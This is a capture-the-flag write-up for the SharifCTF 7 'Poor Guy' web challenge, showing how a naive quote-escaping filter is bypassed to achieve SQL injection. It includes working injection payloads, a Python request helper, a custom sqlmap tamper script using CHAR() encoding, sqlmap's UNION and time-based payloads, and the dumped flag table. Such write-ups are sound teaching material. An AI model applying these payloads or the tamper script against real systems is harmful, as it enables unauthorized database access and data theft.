---
layout: post
title: "SharifCTF 7: Poor Guy (Web 150)"
author: f0rki
categories: writeup
tags: [cat/web, tool/sqlmap]
---

* **Category:** Web
* **Points:** 150
* **Description:**

>I'm a poor guy.  Please buy me the secret flag.
>
>  * username: poorguy
>
>  * password: withnomoney
>
>  Hint: SQL Injection
>
>  Hint 2: `$input_escaped = str_replace("'","\'",$user_input);`

## Write-up

So we could log in to a bookstore and "buy" books if we had the serial number.
We were pretty confident that it was a SQL injection but didn't get anything
reasonable out with our queries. Only with the second hint we finally realized
what the problem was.

```php
$input_escaped = str_replace("'","\'",$user_input);
```

Now this is the poor mans version of `addslashes` and can be easily bypassed by 
prepending a `\` to every `'`. This way
`\'` turns to `\\'`, which is an escaped backslash.

Problem with this is that it breaks all the strings in the queries. So we
cannot really use such `'strings'` in our query. This can be avoided by 
replacing literal strings with  something like`CHAR(0x73)+CHAR(0x74)+CHAR(0x72)+CHAR(0x69)+CHAR(0x6e)+CHAR(0x67)`.

So we could achieve a blind SQL injection with the `book_selection` parameter.
For example with the following input:

```sql
9780060878849\' or 1=1 and substring(@@version,1,1)=5 -- x
```

With the following python helpers I managed to extract a good deal of
information out of the database, but got bored/annoyed by extracting
tablesnames etc.

```python

def view_book(book_selection):
    log.debug("payload: " + repr(book_selection))
    res = s.post('http://ctf.sharif.edu:8086/index.php',
                 data={'book_selection': book_selection})
    return res


def inject(pl):
    pl = r"1234\' " + pl
    return view_book(pl)


def char_encode(s):
    r = []
    for c in s:
        r.append("CHAR(0x{:x})".format(ord(c)))
    return "+".join(r)


def test_query(q):
    pl = r"1234\' or 1=1 and " + q + " -- x"
    for s in re.findall(r"[^\\]'(.+?)'", pl):
        # print(s)
        ns = char_encode(s)
        pl = pl.replace("'" + s + "'", ns)
    return "<img src" in view_book(pl).text.split("\n")[-10]
```

I turned to `sqlmap` for help, as all this tedious stuff is already impelmented
there.  Of course it wouldn't detect anything useful because it doesn't know
about the custom filter function. So I wrote a custom tamper script to modify
the payload, which then worked out.

```python
#!/usr/bin/env python

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOWEST


def dependencies():
    pass


def char_encode(s):
    r = []
    for c in s:
        r.append("CHAR(0x{:x})".format(ord(c)))
    return "+".join(r)


def tamper(payload, **kwargs):
    for s in re.findall(r"[^\\]'(.+?)'", payload):
        ns = char_encode(s)
        payload = payload.replace("'" + s + "'", ns)
    # assert "'" not in payload, "nope nope " + repr(payload)
    return r"\' or 1=1 " + payload
```

`sqlmap` identified the following injection points

```
Parameter: #1* ((custom) POST)
    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: book_selection= AND SLEEP(5)-- uejC

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: book_selection=-5036 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71767a7a71,0x486b646f6e65526d4679486976496a785a7975795778684a47784552524e4d6d4b4e72697070514a,0x7170
7a6a71),NULL-- SOWX
```

and dumped the table, which contained the flag

```
Database: book_shop
Table: books
[4 entries]
+---------+---------------------+---------------+------------+--------------------------------------+---------------------------------------------+
| book_id | book_name           | book_isbn     | is_premium | book_cover                           | book_serial                                 |
+---------+---------------------+---------------+------------+--------------------------------------+---------------------------------------------+
| 1       | Poor people         | 9780060878849 | 0          | .\\book covers\\poor people.png      | 123456                                      |
| 2       | Hacking for dummies | 9781118380932 | 0          | .\\book covers\\hack for dummies.jpg | 7890                                        |
| 3       | Secret flag         | 9788479536442 | 1          | .\\book covers\\secret flag book.jpg | SharifCTF{931b20ec7700a61e5d280888662757af} |
| 4       | Leading             | 9781473621640 | 0          | .\\book covers\\leading.jpg          | 239rj2if3r23re                              |
+---------+---------------------+---------------+------------+--------------------------------------+---------------------------------------------+
```
